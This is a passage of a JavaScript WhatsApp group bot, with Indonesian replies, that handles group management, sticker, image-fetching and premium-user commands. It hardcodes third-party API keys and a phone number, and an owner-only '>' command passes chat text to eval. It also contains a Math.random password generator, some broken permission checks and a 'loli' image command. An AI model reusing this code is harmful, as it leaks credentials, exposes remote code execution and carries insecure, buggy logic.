if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await comot.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'leave': {
if (!isCreator) return reply(mess.owner)
await comot.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'emojimix2': {
if (!isPrem) return reply(mess.prem)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return reply(`𝗖𝗼𝗻𝘁𝗼𝗵 : ${prefix + command} 😅+🤔`)
if (!emoji2) return reply(`𝗖𝗼𝗻𝘁𝗼𝗵 : ${prefix + command} 😅+🤔`)
reply(mess.wait)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await comot.sendImageAsSticker(m.chat, res.url, m, {
packname: global.packname,
author: global.author,
categories: res.tags
})
await fs.unlinkSync(encmedia)
}
}
break
case 'emojimix1': {
if (!isPrem) return reply(mess.prem)
if (!text) return reply(`𝗖𝗼𝗻𝘁𝗼𝗵 : ${prefix + command} 😅`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await comot.sendImageAsSticker(m.chat, res.url, m, {
packname: global.packname,
author: global.author,
categories: res.tags
})
await fs.unlinkSync(encmedia)
}
}
break
case 'reportbug':{
let ripotbug = args[0]
if (!text) return reply('Teksnya?')
reply('Oke Kak Reportmu Sudah Terkirim Ke Owner')
comot.sendMessage('6283838077485@s.whatsapp.net', { text: `===[ 𝗥𝗘𝗣𝗢𝗥𝗧 ]===\n𝗣𝗲𝘀𝗮𝗻 : ${q} , 𝗱𝗮𝗿𝗶 : @${sender.split('@')[0]}\n𝗸𝗲𝘁𝗶𝗸 ${prefix}accreport 𝘂𝗻𝘁𝘂𝗸 𝗸𝗼𝗻𝗳𝗶𝗿𝗺𝗮𝘀𝗶 , 𝗸𝗲𝘁𝗶𝗸 ${prefix}acc 𝗺𝗲𝗻𝗼𝗹𝗮𝗸 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶`, mentions: [sender]}, { quoted: fkontak })
}
break     
case 'accreport': {
let messageText = `𝗟𝗮𝗽𝗼𝗿𝗮𝗻 𝘁𝗲𝗹𝗮𝗵 𝗱𝗶 𝘁𝗲𝗿𝗶𝗺𝗮 , 𝗽𝗲𝗿𝗺𝗶𝗻𝘁𝗮𝗮𝗻 𝗮𝗻𝗱𝗮 𝘀𝗲𝗱𝗮𝗻𝗴 𝗱𝗶 𝗽𝗿𝗼𝘀𝗲𝘀`
let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;
comot.sendMessage(targetNumber, {
text: `*${messageText}*`,
mentions: [sender]
}, {
quoted: fkontak
}).then(() => {
reply('𝗠𝗲𝗺𝗯𝗮𝗹𝗮𝘀 𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹');
}).catch(() => {
reply('𝗘𝗿𝗼𝗿 𝗺𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗽𝗲𝘀𝗮𝗻');
});
}
break
case 'acc': {
let messageText = `𝗟𝗮𝗽𝗼𝗿𝗮𝗻 𝗱𝗶𝘁𝗼𝗹𝗮𝗸 , 𝗳𝗶𝘁𝘂𝗿 𝘁𝗲𝗿𝘀𝗲𝗯𝘂𝘁 𝘁𝗶𝗱𝗮𝗸 𝗲𝗿𝗼𝗿/𝘁𝗶𝗱𝗮𝗸 𝗱𝗶𝘁𝗲𝗺𝘂𝗸𝗮𝗻`
let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;
comot.sendMessage(targetNumber, {
text: `*${messageText}*`,
mentions: [sender]
}, {
quoted: fkontak
}).then(() => {
reply('𝗠𝗲𝗻𝗼𝗹𝗮𝗸 𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹');
}).catch(() => {
reply('𝗘𝗿𝗼𝗿 𝗺𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗽𝗲𝘀𝗮𝗻');
});
}
break
case 'opentime': {
if (!m.isGroup) 
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : opentime 𝟭𝟬 𝘀𝗲𝗰𝗼𝗻𝗱/𝗺𝗶𝗻𝘂𝘁𝗲/𝗵𝗼𝘂𝗿')
}
reply(`𝗚𝗿𝗼𝘂𝗽 𝗮𝗸𝗮𝗻 𝗱𝗶 𝗯𝘂𝗸𝗮 𝗱𝗮𝗹𝗮𝗺 𝗯𝗲𝗯𝗲𝗿𝗮𝗽𝗮 𝘀𝗮𝗮𝘁 ${q} `)
setTimeout(() => {
var nomor = m.participant
const open = `𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗺𝗲𝗺𝗯𝘂𝗸𝗮 𝗴𝗿𝗼𝘂𝗽 𝗱𝗮𝗹𝗮𝗺 𝘄𝗮𝗸𝘁𝘂 ${q}`
comot.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
}
break
case 'animespank':
if (!isPrem) return reply(mess.prem)
reply(mess.wait)
waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
await comot.sendMessage(m.chat, { caption:  `𝗧𝗮𝗻𝗴𝗴𝘂𝗻𝗴 𝗗𝗼𝘀𝗮 𝗞𝗮𝗸`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
return(mess.error)
})
break
case 'walpaperanime': {
reply(mess.wait)
comot.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/wallnime?apikey=haikalgans`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break
case 'loli': {
reply(mess.wait)
comot.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/loli`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break
case 'cosplay': {
reply(mess.wait)
comot.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/cosplay`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break
case 'cecan':
case 'china':
case 'cogan':
case 'indonesia':
case 'korea':
case 'malaysia':
case 'thailand':
case 'vietnam': {
reply(mess.wait)
let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/${prefix+command}.json`)
result = anu[Math.floor(Math.random() * anu.length)]               
comot.sendMessage(m.chat, { image: { url: result}, caption: '𝗗𝗼𝗻𝗲 𝗞𝗮𝗸' }, { quoted: m })
}
break
case 'couple': {
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
reply(mess.wait)
comot.sendMessage(m.chat, {
image: {
url: random.male
},
caption: `𝗖𝗼𝘂𝗽𝗹𝗲 𝗰𝗲𝘄𝗲`
}, {
quoted: m
})
comot.sendMessage(m.chat, {
image: {
url: random.female
},
caption: `𝗖𝗼𝘂𝗽𝗹𝗲 𝗰𝗼𝘄𝗼`
}, {
quoted: m
})
}
break
case 'waifu': {
reply(mess.wait)
comot.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/waifu`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break 
case 'gimage': {
if (!isPrem) return reply(mess.prem)
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝗻𝗮𝗿𝘂𝘁𝗼`)
reply(mess.wait)
comotezyanu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)
n = comotezyanu.result
images = n[Math.floor(Math.random() * n.length)]
comot.sendMessage(m.chat, { image: { url: images}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`}, { quoted: m })
}
break
case 'listpremium':
teks = '𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗹𝗶𝘀𝘁\n\n'
for (let comot of prem) {
teks += `- ${comot}\n`
}
teks += `\n*Total : ${prem.length}*`
comot.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'addprem':
if (!isCreator) return reply (mess.owner)
if (!args[0]) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 :${prefix + command} 𝟲𝟮𝟴𝟯𝟴𝟯𝟴𝟬𝟳𝟳𝟰𝟴𝟱`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await comot.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`𝗡𝗼𝗺𝗼𝗿 𝗧𝗶𝗱𝗮𝗸 𝗩𝗮𝗹𝗶𝗱`)
prem.push(prrkek)
fs.writeFileSync('./comot/database/premium.json', JSON.stringify(prem))
reply(`𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗠𝗲𝗻𝗮𝗺𝗯𝗮𝗵𝗸𝗮𝗻 𝗣𝗿𝗲𝗺𝗶𝘂𝗺`)
break
case 'delprem':
if (!isCreator) return reply (mess.owner)
if (!args[0]) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝟲𝟮𝟴𝟯𝟴𝟯𝟴𝟬𝟳𝟳𝟰𝟴𝟱`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./comot/database/premium.json', JSON.stringify(prem))
reply(`𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗠𝗲𝗻𝗴𝗵𝗮𝗽𝘂𝘀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺`)
break
case "tiktok": {
if (!q) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} https://vm.tiktok.com/ZSLdF9NYN`)
await reply(mess.wait)
let tik = await fetchJson(`https://api.tiklydown.me/api/download?url=${q}`)
let vidtik = await comot.sendMessage(from, { video: { url: tik.video.noWatermark }, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸` }, { quoted: m })
}
break
case 'hidetag': {
if (!isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isCreator)
if (!text) return reply(`${petik}Text?${petik}`)
comot.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
case 'group': {
if (!isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`❎ 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝗰𝗹𝗼𝘀𝗲`)
if (args[0] == 'close') {
comot.groupSettingUpdate(from, 'announcement')
reply(mess.succes)
} else if (args[0] == 'open') {
comot.groupSettingUpdate(from, 'not_announcement')
reply(mess.succes)
} else {
reply(`❎ 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗼𝗽𝗲𝗻`)
}}
break
case 'antilink':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
if (!args[0]) return reply(`❎ 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝗼𝗻`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('✅ 𝗔𝗻𝘁𝗶𝗹𝗶𝗻𝗸 𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗮𝗸𝘁𝗶𝗳')
antilink.push(from)
fs.writeFileSync('./comot/database/antilink.json', JSON.stringify(antilink, null, 2))
reply(mess.succes)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply('✅ 𝗔𝗻𝘁𝗶𝗹𝗶𝗻𝗸 𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗱𝗶 𝗻𝗼𝗻𝗮𝘁𝗶𝗳𝗸𝗮𝗻')
let anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./comot/database/antilink.json', JSON.stringify(antilink, null, 2))
reply(mess.succes)
} else { reply(`❎ 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗼𝗻/𝗼𝗳𝗳`) }
           
function generateRandomPassword() {
  // Generate a 10-character random password
  return Array(10).fill(null).map(() => (Math.random() * 16 | 0).toString(16)).join('');
}
break
case 'kick': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await comot.groupParticipantsUpdate(from, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
reply(`𝗗𝗼𝗻𝗲`)
}
break

default:
}
if (budy.startsWith('>')) {
if (!isCreator) return reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (err) {
m.reply(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})